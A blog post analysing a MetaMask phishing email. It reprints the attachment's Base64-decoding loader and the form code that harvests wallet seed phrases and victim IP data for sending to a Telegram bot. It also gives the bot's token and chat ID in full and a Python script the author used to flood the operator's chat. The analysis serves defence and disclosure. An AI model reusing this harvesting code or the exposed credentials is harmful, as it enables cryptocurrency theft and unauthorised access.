---
title: "Dissecting a MetaMask phishing email"
date: 2024-10-27T21:04:50+02:00
draft: false
tags: ["phishing"]
image: "002.png"
post_number: "002"
---

A few days ago, I received a pretty credible-looking MetaMask phishing email stating that my account had been locked due to an attempt to connect a new device to it. It sparked my interest and I decided to spend a bit of time looking into how the technical side of the whole campaign was structured, and potentially even disrupt it.

## Email attachment

The attached HTML file RemovedDevice.html contained a barebones HTML structure with a bit of JS and a long Base64 encoded string that'd get decoded and attached back to the HTML body using jQuery.

```javascript
$(document).ready(function () {
  saveFile();
});

function saveFile(name, type, data) {
  if (data != null && navigator.msSaveBlob)
    return navigator.msSaveBlob(new Blob([data], { type: type }), name);
  var a = $("<a style='display: none;'/>");

  var encodedStringAtoB = "<base64-encoded-string>";
  var decodedStringAtoB = atob(encodedStringAtoB);
  const myBlob = new Blob([decodedStringAtoB], { type: "text/html" });
  const url = window.URL.createObjectURL(myBlob);

  a.attr("href", url);
  $("body").append(a);
  a[0].click();
  window.URL.revokeObjectURL(url);
  a.remove();
}
```

The resulting page would display 12/15/18/21/24 input fields for crypto wallet seed phrases of varying lengths.

The backend of this campaign relied on Telegram, and as usual neither the API token nor the chat ID were even attempted to be obfuscated. This could be tied to the fact that even the template usage information was still present in the source code :^\)

Telegram's chat IDs are structured in a way where supergroups and channels always have IDs with -100 prefix, so it was straightforward to determine that this campaign's data was being exfiltrated into a private chat.

```javascript
// Add your telegram token,chatid
const token = "7686154983:AAFtpdY6iTjT7UiTK6cXh0fM2T4CKfjRHl0";
const chatId = "7839331161";
```

Before sending the gathered information to the chat, the JS snippet would also make a quick GET request to get the victim's public IP and related location data. I couldn't really figure out the point of this as MetaMask is a self-custodial wallet and doesn't utilize any kind of fraud prevention system that could stop the attacker from draining the targeted account if their geolocation didn't match the wallet's owner.

```javascript
wordForm1.addEventListener("submit", (e) => {
  e.preventDefault();
  errbox.classList.add("hide");
  let regex = /[!`@#$~%^&*()\-+={}[\]:;"'<>,.?\/|\\]/;
  let regex2 = /\d/;
  let pass = false;

  for (let i = 0; i < word12Input.length; i++) {
    if (regex.test(word12Input[i].value) || regex2.test(word12Input[i].value)) {
      pass = true;
    }
  }
  if (pass) {
    errbox.classList.remove("hide");
  } else {
    if (
      word12_1.value === "" ||
      word12_2.value === "" ||
      word12_3.value === "" ||
      word12_4.value === "" ||
      word12_5.value === "" ||
      word12_6.value === "" ||
      word12_7.value === "" ||
      word12_8.value === "" ||
      word12_9.value === "" ||
      word12_10.value === "" ||
      word12_11.value === "" ||
      word12_12.value === ""
    ) {
      btncofirm1.disabled = true;
    } else {
      preloader.classList.remove("hide");

      let data = `IP: ${ip.ip}\nRegion: ${ip.region}\nTime Zone: ${ip.timezone}\nWord 1: ${word12_1.value} \nWord 2: ${word12_2.value} \nWord 3: ${word12_3.value} \nWord 4: ${word12_4.value} \nWord 5: ${word12_5.value} \nWord 6: ${word12_6.value} \nWord 7: ${word12_7.value} \nWord 8: ${word12_8.value} \nWord 9: ${word12_9.value} \nWord 10: ${word12_10.value} \nWord 11: ${word12_11.value} \nWord 12: ${word12_12.value}`;
      postData(data);
      setTimeout(() => {
        preloader.classList.add("hide");
        noDone.classList.add("hide");
        done.classList.remove("hide");
        timer2(10);
      }, 4000);
    }
  }
});
```

## Greetings

Using the API token and the chat ID I was able to find out a bit more information about the bot itself via a getMe request and even flood the operator's inbox with randomly generated data to make it more difficult to detect any actual seed phrases from a large amount of made-up responses:

```json
{
  "ok": true,
  "result": {
    "id": 7686154983,
    "is_bot": true,
    "first_name": "wegomakeit",
    "username": "wegomakeit_bot",
    "can_join_groups": true,
    "can_read_all_group_messages": false,
    "supports_inline_queries": false,
    "can_connect_to_business": false,
    "has_main_web_app": false
  }
}
```

```python
import random
import requests
from time import sleep
from address import generate_residential_ip
from phrase import generate_seed_phrase, bip39_words

TOKEN = "7686154983:AAFtpdY6iTjT7UiTK6cXh0fM2T4CKfjRHl0"
CHAT_ID = "7839331161"
API_BASE_URL = f"https://api.telegram.org/bot{TOKEN}"


def construct_msg(words):
    ip, region, timezone = generate_residential_ip()
    phrase = generate_seed_phrase(words, random.choice([12, 15, 18, 21, 24]))

    ip_str = f"IP: {ip}\nRegion: {region}\nTime Zone: {timezone}\n"
    phrase_str = ""

    for i, w in enumerate(phrase):
        w_str = f"Word {i + 1}: {w} \n"
        phrase_str += w_str

    return ip_str + phrase_str


def send_msg(words, chat_id):
    payload = {"chat_id": chat_id, "text": construct_msg(words)}
    res = requests.post(f"{API_BASE_URL}/sendMessage", data=payload)
    print(res.text)


words = bip39_words()

while True:
    send_msg(words, CHAT_ID)
    sleep(random.randint(1, 10))
```

I left the bot running in a Docker container for some time, and in the end I was able to send roughly 10k messages before the operator revoked the API token. The whole campaign was ruined at this point as the original token was hardcoded into the attachment, and replacing it in the already-sent emails wouldn't be possible.

Next time I get a cryptocurrency-related phishing email like this, I'd like to try tracking the stolen funds by giving out the seed phrase of a fresh wallet with e.g. $5-10 USD worth of funds inside and see what kind of anti-forensic methods the attacker would utilize (although given the quality of this campaign, they'd probably just deposit immediately into a full-KYC CEX).
